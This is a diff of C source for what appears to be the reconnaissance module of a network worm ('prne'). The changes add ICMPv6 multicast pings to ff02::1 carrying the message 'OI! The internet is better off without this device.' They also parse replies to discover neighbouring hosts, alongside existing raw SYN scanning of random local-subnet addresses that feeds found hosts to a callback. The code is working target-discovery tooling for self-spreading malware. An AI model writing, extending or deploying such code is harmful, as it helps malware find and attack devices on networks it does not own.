@@ -13,15 +13,24 @@
 #include <fcntl.h>
 #include <netinet/ip6.h>
 #include <arpa/inet.h>
+#include <netinet/icmp6.h>
+/*
+* This header defines IFF_*. But since _POSIX_C_SOURCE=200112L has to be used,
+* IFF_* flags can not be used.
+*/
+// #include <net/if.h>
 
-#include <ifaddrs.h>
-#include <linux/if_ether.h>
-#include <linux/tcp.h>
+#if PRNE_HOST_OS == PRNE_OS_LINUX
+	#include <ifaddrs.h>
+	#include <linux/if_ether.h>
+	#include <linux/tcp.h>
+#else
+	#error "FIXME!"
+#endif
 
-
-static const struct timespec RCN_ERR_PAUSE_INT = { 1, 0 }; // 1 s
-#define RCN_II_UPDATE_INT_MIN 43200 // 0.5 days
-#define RCN_II_UPDATE_INT_VAR 43200 // 0.5 days
+static const struct timespec RCN_ERR_PAUSE_INT = { 10, 0 }; // 10 s
+#define RCN_II_UPDATE_INT_MIN 43200000 // 0.5 days
+#define RCN_II_UPDATE_INT_VAR 43200000 // 0.5 days
 #define RCN_SRC_PORT_MIN 1024
 #define RCN_SRC_PORT_VAR 64511
 // 800ms ~ 1200ms tick
@@ -30,10 +39,26 @@ static const struct timespec RCN_ERR_PAUSE_INT = { 1, 0 }; // 1 s
 // 60 ~ 160 syn packets per tick
 static const uint_fast32_t RCN_SYN_PPT_MIN = 60;
 static const uint_fast32_t RCN_SYN_PPT_VAR = 100;
+#define RCN_ICMPV6_PING_CNT 4
 
 #define RCN_IDX_IPV4	0
 #define RCN_IDX_IPV6	1
 #define RCN_NB_FD		2
+
+static const uint8_t RCN_ICMP_ECHO_DATA[] = {
+	'O', 'I', '!', ' ', 'T', 'h', 'e', ' ',
+	'i', 'n', 't', 'e', 'r', 'n', 'e', 't',
+	' ', 'i', 's', ' ', 'b', 'e', 't', 't',
+	'e', 'r', ' ', 'o', 'f', 'f', ' ', 'w',
+	'i', 't', 'h', 'o', 'u', 't', ' ', 't',
+	'h', 'i', 's', ' ', 'd', 'e', 'v', 'i',
+	'c', 'e', '.', '@', '#', '$', '%', '^'
+};
+static const uint8_t RCN_ICMP_ECHO_DST[] = {
+	0xff, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01
+};
+prne_static_assert(sizeof(RCN_ICMP_ECHO_DST) == 16, "RCN_ICMP_ECHO_DST");
 
 typedef struct {
 	uint32_t cur;
@@ -41,11 +66,16 @@ typedef struct {
 } rcn_srcaddr_ctr_t;
 
 typedef struct {
-	prne_ip_addr_t ep;
-	uint8_t network[16];
-	uint8_t hostmask[16];
+	uint8_t addr[4];
+	uint8_t network[4];
+	uint8_t hostmask[4];
 	rcn_srcaddr_ctr_t ctr;
-} rcn_ifaceinfo_t;
+} rcn_v4ifaceinfo_t;
+
+typedef struct {
+	uint8_t addr[16];
+	uint32_t scope_id;
+} rcn_v6ifaceinfo_t;
 
 struct prne_recon {
 	prne_recon_param_t param;
@@ -55,9 +85,16 @@ struct prne_recon {
 	struct {
 		struct timespec ii_up; // next subnet update
 	} ts;
-	prne_llist_t ii_list;
-	prne_llist_entry_t *ii_ptr;
+	struct {
+		prne_llist_t list;
+		prne_llist_entry_t *ptr;
+	} v4_ii;
+	struct {
+		rcn_v6ifaceinfo_t *arr;
+		size_t cnt;
+	} v6_ii;
 	size_t t_ptr;
+	size_t ping_cnt;
 	int fd[RCN_NB_FD][2];
 	uint8_t v6_saddr[16];
 	uint8_t v4_saddr[4];
@@ -67,168 +104,199 @@ struct prne_recon {
 	bool send_ptr;
 };
 
-static void rcn_main_empty_ii_list (prne_recon_t *ctx) {
-	prne_llist_entry_t *ent = ctx->ii_list.head;
+static void rcn_main_empty_v4_ii (prne_recon_t *ctx) {
+	prne_llist_entry_t *ent = ctx->v4_ii.list.head;
 
 	while (ent != NULL) {
 		prne_free((void*)ent->element);
 		ent = ent->next;
 	}
-	prne_llist_clear(&ctx->ii_list);
-	ctx->ii_ptr = NULL;
+	prne_llist_clear(&ctx->v4_ii.list);
+	ctx->v4_ii.ptr = NULL;
 }
 
-static bool rcn_main_good_iface (const struct ifaddrs *ia) {
-	return
-		ia->ifa_addr != NULL &&
-		ia->ifa_netmask != NULL &&
-		(ia->ifa_flags & 0x1) && // up
-		!(ia->ifa_flags & 0x8); // and not loopback
+static void rcn_main_empty_v6_ii (prne_recon_t *ctx) {
+	prne_free(ctx->v6_ii.arr);
+	ctx->v6_ii.arr = NULL;
+	ctx->v6_ii.cnt = 0;
 }
 
 static uint32_t rcn_build_srcaddr4_ctr (const uint8_t *arr) {
 	return ~prne_recmb_msb32(arr[0], arr[1], arr[2], arr[3]);
 }
 
-static uint32_t rcn_build_srcaddr6_ctr (const uint8_t *arr) {
-	return ~prne_recmb_msb32(arr[14], arr[13], arr[14], arr[15]);
+static bool rcn_main_do_ifaddr_4 (
+	prne_recon_t *ctx,
+	const struct ifaddrs *ia,
+	prne_llist_t *list)
+{
+	const struct ifaddrs *ia_ent;
+	const struct sockaddr_in *sa;
+	rcn_v4ifaceinfo_t *info;
+	prne_llist_entry_t *ent;
+
+	if (ctx->fd[RCN_IDX_IPV4][1] < 0) {
+		return true;
+	}
+
+	for (ia_ent = ia; ia_ent != NULL; ia_ent = ia_ent->ifa_next) {
+		if (ia_ent->ifa_addr->sa_family != AF_INET || // is not v4
+			ia_ent->ifa_addr == NULL || // no address
+			ia_ent->ifa_netmask == NULL || // no netmask
+			(ia_ent->ifa_flags & 0x1) == 0 || // is not up
+			(ia_ent->ifa_flags & 0x8) != 0) // is loopback
+		{
+			continue;
+		}
+
+		ent = prne_llist_append(list, 0);
+		if (ent == NULL) {
+			return false;
+		}
+		info = (rcn_v4ifaceinfo_t*)prne_calloc(sizeof(rcn_v4ifaceinfo_t), 1);
+		if (info == NULL) {
+			return false;
+		}
+		ent->element = (prne_llist_element_t)info;
+
+		sa = (const struct sockaddr_in*)ia_ent->ifa_addr;
+		memcpy(info->addr, &sa->sin_addr, 4);
+
+		sa = (const struct sockaddr_in*)ia_ent->ifa_netmask;
+		prne_bitop_and(
+			info->addr,
+			(const uint8_t*)&sa->sin_addr,
+			info->network,
+			4);
+		prne_bitop_inv((const uint8_t*)&sa->sin_addr, info->hostmask, 4);
+		info->ctr.max = rcn_build_srcaddr4_ctr((const uint8_t*)&sa->sin_addr);
+	}
+
+	return true;
+}
+
+static bool rcn_main_do_ifaddr_6 (
+	prne_recon_t *ctx,
+	const struct ifaddrs *ia,
+	rcn_v6ifaceinfo_t **oarr,
+	size_t *olen)
+{
+#define is_good_ia() \
+	(ia_ent->ifa_addr->sa_family == AF_INET6 /* is v6 */ &&\
+	ia_ent->ifa_addr != NULL /* has address */ &&\
+	ia_ent->ifa_netmask != NULL /* has netmask */ &&\
+	(ia_ent->ifa_flags & 0x1) != 0 /* is up */ &&\
+	(ia_ent->ifa_flags & 0x8) == 0 /* is not loopback */ &&\
+	(ia_ent->ifa_flags & 0x1000) != 0 /* supports multicast */ &&\
+	/* is scoped */\
+	((const struct sockaddr_in6*)ia_ent->ifa_addr)->sin6_scope_id != 0)
+
+	const struct ifaddrs *ia_ent;
+	const struct sockaddr_in6 *sa;
+	rcn_v6ifaceinfo_t *info;
+	size_t cnt = 0;
+
+	if (ctx->fd[RCN_IDX_IPV6][1] < 0) {
+		return true;
+	}
+
+	for (ia_ent = ia; ia_ent != NULL; ia_ent = ia_ent->ifa_next) {
+		if (!is_good_ia()) {
+			continue;
+		}
+		cnt += 1;
+	}
+	info = (rcn_v6ifaceinfo_t*)prne_malloc(sizeof(rcn_v6ifaceinfo_t), cnt);
+	if (info == NULL && cnt > 0) {
+		return false;
+	}
+	*oarr = info;
+	*olen = cnt;
+
+	for (ia_ent = ia; ia_ent != NULL; ia_ent = ia_ent->ifa_next) {
+		if (!is_good_ia()) {
+			continue;
+		}
+		sa = (const struct sockaddr_in6*)ia_ent->ifa_addr;
+		memcpy(info->addr, &sa->sin6_addr, 16);
+		info->scope_id = sa->sin6_scope_id;
+
+		info += 1;
+	}
+
+	return true;
+#undef is_good_ia
 }
 
 static bool rcn_main_do_ifaddrs (prne_recon_t *ctx) {
 	bool ret = false;
-	struct ifaddrs *ia_arr = NULL, *ia_ent;
-	struct sockaddr_in *sa4;
-	struct sockaddr_in6 *sa6;
-	rcn_ifaceinfo_t *info;
-	prne_llist_entry_t *ent;
+	struct ifaddrs *ia;
+	prne_llist_t v4list;
+	rcn_v6ifaceinfo_t *v6arr = NULL;
+	size_t v6cnt = 0;
 
-	rcn_main_empty_ii_list(ctx);
+	prne_init_llist(&v4list);
 
-	if (getifaddrs(&ia_arr) != 0) {
+	if (getifaddrs(&ia) != 0) {
+		goto END;
+	}
+	if (!rcn_main_do_ifaddr_4(ctx, ia, &v4list) ||
+		!rcn_main_do_ifaddr_6(ctx, ia, &v6arr, &v6cnt))
+	{
 		goto END;
 	}
 
-	for (ia_ent = ia_arr; ia_ent != NULL; ia_ent = ia_ent->ifa_next) {
-		if (!rcn_main_good_iface(ia_ent)) {
-			continue;
-		}
+	rcn_main_empty_v4_ii(ctx);
+	prne_free_llist(&ctx->v4_ii.list);
+	ctx->v4_ii.list = v4list;
+	ctx->v4_ii.ptr = ctx->v4_ii.list.head;
+	prne_init_llist(&v4list);
+	rcn_main_empty_v6_ii(ctx);
+	ctx->v6_ii.arr = v6arr;
+	ctx->v6_ii.cnt = v6cnt;
+	v6arr = NULL;
+	v6cnt = 0;
 
-		switch (ia_ent->ifa_addr->sa_family) {
-		case AF_INET:
-			if (ctx->fd[RCN_IDX_IPV4][1] < 0) {
-				continue;
-			}
-			break;
-		case AF_INET6:
-			if (ctx->fd[RCN_IDX_IPV6][1] < 0) {
-				continue;
-			}
-			break;
-		}
-
-		switch (ia_ent->ifa_addr->sa_family) {
-		case AF_INET6:
-			sa6 = (struct sockaddr_in6*)ia_ent->ifa_addr;
-			if (sa6->sin6_scope_id != 0) {
-				continue;
-			}
-			/* fall-through */
-		case AF_INET:
-			ent = prne_llist_append(&ctx->ii_list, 0);
-			if (ent == NULL) {
-				goto END;
-			}
-			info = (rcn_ifaceinfo_t*)prne_calloc(sizeof(rcn_ifaceinfo_t), 1);
-			if (info == NULL) {
-				goto END;
-			}
-			ent->element = (prne_llist_element_t)info;
-			break;
-		default: continue;
-		}
-
-		switch (ia_ent->ifa_addr->sa_family) {
-		case AF_INET:
-			info->ep.ver = PRNE_IPV_4;
-			sa4 = (struct sockaddr_in*)ia_ent->ifa_addr;
-			memcpy(info->ep.addr, &sa4->sin_addr, 4);
-
-			sa4 = (struct sockaddr_in*)ia_ent->ifa_netmask;
-			prne_bitop_and(
-				info->ep.addr,
-				(const uint8_t*)&sa4->sin_addr,
-				info->network,
-				4);
-			prne_bitop_inv((const uint8_t*)&sa4->sin_addr, info->hostmask, 4);
-			info->ctr.max = rcn_build_srcaddr4_ctr(
-				(const uint8_t*)&sa4->sin_addr);
-			break;
-		case AF_INET6:
-			info->ep.ver = PRNE_IPV_6;
-			sa6 = (struct sockaddr_in6*)ia_ent->ifa_addr;
-			memcpy(info->ep.addr, &sa6->sin6_addr, 16);
-
-			sa6 = (struct sockaddr_in6*)ia_ent->ifa_netmask;
-			prne_bitop_and(
-				info->ep.addr,
-				(const uint8_t*)&sa6->sin6_addr,
-				info->network,
-				16);
-			prne_bitop_inv((const uint8_t*)&sa6->sin6_addr, info->hostmask, 16);
-			info->ctr.max = rcn_build_srcaddr6_ctr(
-				(const uint8_t*)&sa6->sin6_addr);
-			break;
-		}
-	}
-
-	ctx->ii_ptr = ctx->ii_list.head;
 	ret = true;
 END:
-	if (!ret) {
-		rcn_main_empty_ii_list(ctx);
-	}
-	freeifaddrs(ia_arr);
+	freeifaddrs(ia);
+	prne_free_llist(&v4list);
+	prne_free(v6arr);
 
 	return ret;
 }
 
-static prne_ipv_t rcn_main_genaddr_ii (
+static bool rcn_main_genaddr_ii_4 (
 	prne_recon_t *ctx,
 	uint8_t *src,
 	uint8_t *dst)
 {
-	prne_ipv_t ret = PRNE_IPV_NONE;
-	rcn_ifaceinfo_t *info;
-	size_t l;
+	bool ret = false;
+	rcn_v4ifaceinfo_t *info;
 
-	while (ctx->ii_ptr != NULL && ret == PRNE_IPV_NONE) {
-		info = (rcn_ifaceinfo_t*)ctx->ii_ptr->element;
+	while (ctx->v4_ii.ptr != NULL && !ret) {
+		info = (rcn_v4ifaceinfo_t*)ctx->v4_ii.ptr->element;
 
 		if (info->ctr.cur >= info->ctr.max) {
 			prne_free(info);
-			ctx->ii_ptr = prne_llist_erase(&ctx->ii_list, ctx->ii_ptr);
+			ctx->v4_ii.ptr = prne_llist_erase(&ctx->v4_ii.list, ctx->v4_ii.ptr);
 		}
 		else {
-			ctx->ii_ptr = ctx->ii_ptr->next;
-			switch (info->ep.ver) {
-			case PRNE_IPV_4: l = 4; break;
-			case PRNE_IPV_6: l = 16; break;
-			default: abort();
-			}
+			ctx->v4_ii.ptr = ctx->v4_ii.ptr->next;
 
-			memcpy(src, info->ep.addr, l);
-			prne_rnd(&ctx->rnd, dst, l);
-			prne_bitop_and(dst, info->hostmask, dst, l);
-			prne_bitop_or(dst, info->network, dst, l);
+			memcpy(src, info->addr, 4);
+			prne_rnd(&ctx->rnd, dst, 4);
+			prne_bitop_and(dst, info->hostmask, dst, 4);
+			prne_bitop_or(dst, info->network, dst, 4);
 
 			info->ctr.cur += 1;
-			if (memcmp(src, dst, l) != 0) {
-				ret = info->ep.ver;
+			if (memcmp(src, dst, 4) != 0) {
+				ret = true;
 			}
 		}
 
-		if (ctx->ii_ptr == NULL) {
-			ctx->ii_ptr = ctx->ii_list.head;
+		if (ctx->v4_ii.ptr == NULL) {
+			ctx->v4_ii.ptr = ctx->v4_ii.list.head;
 		}
 	}
 
@@ -330,12 +398,10 @@ static prne_ipv_t rcn_main_gen_addr (
 	prne_ipv_t ret = PRNE_IPV_NONE;
 
 	ctx->send_ptr = !ctx->send_ptr;
-	if (ctx->send_ptr) {
-		ret = rcn_main_genaddr_ii(ctx, src, dst);
-		if (ret != PRNE_IPV_NONE) {
-			*snd_flags |= MSG_DONTROUTE;
-			return ret;
-		}
+	if (ctx->send_ptr && rcn_main_genaddr_ii_4(ctx, src, dst)) {
+		ret = PRNE_IPV_4;
+		*snd_flags |= MSG_DONTROUTE;
+		return ret;
 	}
 	return rcn_main_genaddr_param(ctx, src, dst);
 }
@@ -520,6 +586,83 @@ static void rcn_main_send_syn (prne_recon_t *ctx) {
 	}
 }
 
+static void rcn_main_send_icmpv6_from (
+	prne_recon_t *ctx,
+	const rcn_v6ifaceinfo_t *from)
+{
+	prne_iphdr6_t iph;
+	struct icmp6_hdr icmph;
+	uint8_t m_pkt[
+		40 +
+		sizeof(struct icmp6_hdr) +
+		sizeof(RCN_ICMP_ECHO_DATA)];
+	uint8_t *p = m_pkt;
+	struct sockaddr_in6 sa;
+	int f_ret;
+
+	prne_memzero(&iph, sizeof(iph));
+	prne_memzero(&icmph, sizeof(icmph));
+	prne_memzero(&sa, sizeof(sa));
+
+	sa.sin6_family = AF_INET6;
+	memcpy(&sa.sin6_addr, RCN_ICMP_ECHO_DST, 16);
+	sa.sin6_scope_id = from->scope_id;
+
+	iph.payload_len = sizeof(struct icmp6_hdr) + sizeof(RCN_ICMP_ECHO_DATA);
+	iph.next_hdr = IPPROTO_ICMPV6;
+	iph.hop_limit = 1;
+	memcpy(iph.saddr, from->addr, 16);
+	memcpy(iph.daddr, RCN_ICMP_ECHO_DST, 16);
+
+	icmph.icmp6_type = ICMP6_ECHO_REQUEST;
+	icmph.icmp6_id = htons((uint16_t)ctx->seq_mask);
+	icmph.icmp6_cksum = htons(prne_calc_tcp_chksum6(
+		&iph,
+		(const uint8_t*)&icmph,
+		sizeof(icmph),
+		RCN_ICMP_ECHO_DATA,
+		sizeof(RCN_ICMP_ECHO_DATA)));
+	prne_ser_iphdr6(p, &iph);
+	p += 40;
+	memcpy(p, &icmph, sizeof(icmph));
+	p += sizeof(icmph);
+	memcpy(p, RCN_ICMP_ECHO_DATA, sizeof(RCN_ICMP_ECHO_DATA));
+	p += sizeof(RCN_ICMP_ECHO_DATA);
+
+	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0 + 1) {
+		char s_str[INET6_ADDRSTRLEN];
+		char d_str[INET6_ADDRSTRLEN];
+
+		prne_assert(
+			inet_ntop(AF_INET6, iph.saddr, s_str, sizeof(s_str)) &&
+			inet_ntop(AF_INET6, iph.daddr, d_str, sizeof(d_str)));
+		prne_dbgpf(
+			"Send ICMPv6 ECHO [%s%%%"PRIu32"] -> [%s] id=%"PRIu16" seq=%"PRIu16"\n",
+			s_str,
+			from->scope_id,
+			d_str,
+			ntohs(icmph.icmp6_id),
+			ntohs(icmph.icmp6_seq));
+	}
+
+	f_ret = sendto(
+		ctx->fd[RCN_IDX_IPV6][1],
+		m_pkt,
+		sizeof(m_pkt),
+		MSG_NOSIGNAL,
+		(struct sockaddr*)&sa,
+		sizeof(sa));
+	if (f_ret < 0 && PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
+		prne_dbgperr("** ICMPv6 sendto()@rcn");
+	}
+}
+
+static void rcn_main_send_icmpv6 (prne_recon_t *ctx) {
+	for (size_t i = 0; i < ctx->v6_ii.cnt; i += 1) {
+		rcn_main_send_icmpv6_from(ctx, ctx->v6_ii.arr + i);
+	}
+}
+
 static void rcn_main_recv_syn_tail (
 	prne_recon_t *ctx,
 	const struct tcphdr *th,
@@ -534,8 +677,8 @@ static void rcn_main_recv_syn_tail (
 	}
 }
 
-static void rcn_main_recv_syn4 (prne_recon_t *ctx) {
-	int f_ret;
+static void rcn_main_recv_4 (prne_recon_t *ctx) {
+	ssize_t f_ret;
 	uint8_t buf[
 		20 +
 		60 + // options
@@ -561,7 +704,7 @@ static void rcn_main_recv_syn4 (prne_recon_t *ctx) {
 			}
 			break;
 		}
-		if ((size_t)f_ret < 20) {
+		if (f_ret < 20) {
 			continue;
 		}
 		prne_dser_iphdr4(buf, &ih);
@@ -585,15 +728,24 @@ static void rcn_main_recv_syn4 (prne_recon_t *ctx) {
 	}
 }
 
-static void rcn_main_recv_syn6 (prne_recon_t *ctx) {
-	int f_ret;
+static void rcn_main_recv_6 (prne_recon_t *ctx) {
+	ssize_t f_ret;
 	uint8_t buf[1024];
 	prne_iphdr6_t ih;
-	struct tcphdr th;
+	uint8_t m_hdr[prne_op_max(
+		sizeof(struct tcphdr),
+		sizeof(struct icmp6_hdr))];
+	struct tcphdr *th;
+	struct icmp6_hdr *icmph;
 	size_t ext_pos;
 	uint8_t next_hdr;
 	uint32_t exp_ack;
 	prne_net_endpoint_t ep;
+	size_t data_len;
+	uint8_t *p = buf;
+
+	prne_memzero(&ep, sizeof(prne_net_endpoint_t));
+	ep.addr.ver = PRNE_IPV_6;
 
 LOOP:
 	while (true) {
@@ -612,19 +764,20 @@ LOOP:
 			}
 			break;
 		}
-		if ((size_t)f_ret < 40) {
+		if (f_ret < 40) {
 			continue;
 		}
 		prne_dser_iphdr6(buf, &ih);
 
 		ext_pos = 40;
 		next_hdr = ih.next_hdr;
-		while (next_hdr != IPPROTO_TCP && ext_pos + 1 > (size_t)f_ret) {
+		// skip ext headers
+		while (next_hdr != IPPROTO_TCP && next_hdr != IPPROTO_ICMPV6) {
 			switch (next_hdr) {
 			case 0:
 			case 43:
 			case 60:
-				if (ext_pos + 2 > (size_t)f_ret) {
+				if (ext_pos + 1 >= (size_t)f_ret) {
 					goto LOOP;
 				}
 				next_hdr = buf[ext_pos];
@@ -635,48 +788,78 @@ LOOP:
 				goto LOOP;
 			}
 		}
-		if ((size_t)f_ret < ext_pos + sizeof(struct tcphdr)) {
-			continue;
-		}
-		memcpy(&th, buf + ext_pos, sizeof(struct tcphdr));
 
-		prne_memzero(&ep, sizeof(prne_net_endpoint_t));
-		ep.addr.ver = PRNE_IPV_6;
 		memcpy(ep.addr.addr, ih.saddr, 16);
-		ep.port = ntohs(th.source);
-		exp_ack =
-			prne_recmb_msb32(
-				ep.addr.addr[0],
-				ep.addr.addr[1],
-				ep.addr.addr[2],
-				ep.addr.addr[3]) ^
-			prne_recmb_msb32(
-				ep.addr.addr[4],
-				ep.addr.addr[5],
-				ep.addr.addr[6],
-				ep.addr.addr[7]) ^
-			prne_recmb_msb32(
-				ep.addr.addr[8],
-				ep.addr.addr[9],
-				ep.addr.addr[10],
-				ep.addr.addr[11]) ^
-			prne_recmb_msb32(
-				ep.addr.addr[12],
-				ep.addr.addr[13],
-				ep.addr.addr[14],
-				ep.addr.addr[15]) ^
-			ctx->seq_mask;
-		exp_ack += 1;
-		rcn_main_recv_syn_tail(ctx, &th, exp_ack, &ep);
+		p += ext_pos;
+		switch (next_hdr) {
+		case IPPROTO_TCP:
+			if ((size_t)f_ret < ext_pos + sizeof(struct tcphdr)) {
+				continue;
+			}
+			memcpy(m_hdr, p, sizeof(struct tcphdr));
+			p += sizeof(struct tcphdr);
+			th = (struct tcphdr*)m_hdr;
+
+			ep.port = ntohs(th->source);
+			exp_ack =
+				prne_recmb_msb32(
+					ep.addr.addr[0],
+					ep.addr.addr[1],
+					ep.addr.addr[2],
+					ep.addr.addr[3]) ^
+				prne_recmb_msb32(
+					ep.addr.addr[4],
+					ep.addr.addr[5],
+					ep.addr.addr[6],
+					ep.addr.addr[7]) ^
+				prne_recmb_msb32(
+					ep.addr.addr[8],
+					ep.addr.addr[9],
+					ep.addr.addr[10],
+					ep.addr.addr[11]) ^
+				prne_recmb_msb32(
+					ep.addr.addr[12],
+					ep.addr.addr[13],
+					ep.addr.addr[14],
+					ep.addr.addr[15]) ^
+				ctx->seq_mask;
+			exp_ack += 1;
+			rcn_main_recv_syn_tail(ctx, th, exp_ack, &ep);
+			break;
+		case IPPROTO_ICMPV6:
+			if ((size_t)f_ret < ext_pos + sizeof(struct icmp6_hdr)) {
+				continue;
+			}
+			memcpy(m_hdr, p, sizeof(struct icmp6_hdr));
+			p += sizeof(struct icmp6_hdr);
+			icmph = (struct icmp6_hdr*)m_hdr;
+			data_len = f_ret - ext_pos - sizeof(struct icmp6_hdr);
+
+			if (memcmp(ih.saddr, ih.daddr, 16) == 0 ||
+				icmph->icmp6_type != ICMP6_ECHO_REPLY ||
+				icmph->icmp6_code != 0 ||
+				ntohs(icmph->icmp6_id) != (uint16_t)ctx->seq_mask ||
+				ntohs(icmph->icmp6_seq) != 0 ||
+				data_len != sizeof(RCN_ICMP_ECHO_DATA) ||
+				memcmp(p, RCN_ICMP_ECHO_DATA, sizeof(RCN_ICMP_ECHO_DATA)) != 0)
+			{
+				continue;
+			}
+			else {
+				ep.port = 0;
+				ctx->param.evt_cb(ctx->param.cb_ctx, &ep);
+			}
+			break;
+		}
 	}
 }
 
-static void rcn_main_recv_syn (prne_recon_t *ctx) {
+static void rcn_main_recv (prne_recon_t *ctx) {
 	if (ctx->fd[RCN_IDX_IPV4][0] >= 0) {
-		rcn_main_recv_syn4(ctx);
+		rcn_main_recv_4(ctx);
 	}
 	if (ctx->fd[RCN_IDX_IPV6][0] >= 0) {
-		rcn_main_recv_syn6(ctx);
+		rcn_main_recv_6(ctx);
 	}
 }
 
@@ -693,7 +876,7 @@ static void *rcn_main_entry (void *ctx_p) {
 
 		// periodic op
 		if (prne_cmp_timespec(ctx->ts.ii_up, ts_now) <= 0) {
-			unsigned int n;
+			unsigned long n;
 
 			rcn_main_update_saddr(ctx);
 
@@ -708,6 +891,7 @@ static void *rcn_main_entry (void *ctx_p) {
 
 			prne_rnd(&ctx->rnd, (uint8_t*)&n, sizeof(n));
 			ctx->s_port = (uint16_t)(RCN_SRC_PORT_MIN + (n % RCN_SRC_PORT_VAR));
+			ctx->ping_cnt = 0;
 		}
 
 		// random
@@ -719,6 +903,13 @@ static void *rcn_main_entry (void *ctx_p) {
 
 		for (unsigned int i = 0; i < syn_cnt; i += 1) {
 			rcn_main_send_syn(ctx);
+		}
+		if (ctx->ping_cnt < RCN_ICMPV6_PING_CNT) {
+			rcn_main_send_icmpv6(ctx);
+			ctx->ping_cnt += 1;
+			if (ctx->ping_cnt >= RCN_ICMPV6_PING_CNT) {
+				rcn_main_empty_v6_ii(ctx);
+			}
 		}
 
 		ts_now = prne_gettime(CLOCK_MONOTONIC);
@@ -752,12 +943,7 @@ static void *rcn_main_entry (void *ctx_p) {
 			pth_mutex_release(&ctx->lock);
 
 			// process
-			for (size_t i = 0; i < RCN_NB_FD; i += 1) {
-				if (ctx->fd[i][0] < 0) {
-					continue;
-				}
-				rcn_main_recv_syn(ctx);
-			}
+			rcn_main_recv(ctx);
 		}
 	}
 
@@ -773,10 +959,11 @@ static void rcn_free_f (void *ctx_p) {
 		return;
 	}
 
-	rcn_main_empty_ii_list(ctx);
+	rcn_main_empty_v4_ii(ctx);
+	rcn_main_empty_v6_ii(ctx);
 
 	prne_free_rnd(&ctx->rnd);
-	prne_free_llist(&ctx->ii_list);
+	prne_free_llist(&ctx->v4_ii.list);
 	prne_close(ctx->fd[RCN_IDX_IPV4][0]);
 	prne_close(ctx->fd[RCN_IDX_IPV4][1]);
 	prne_close(ctx->fd[RCN_IDX_IPV6][0]);
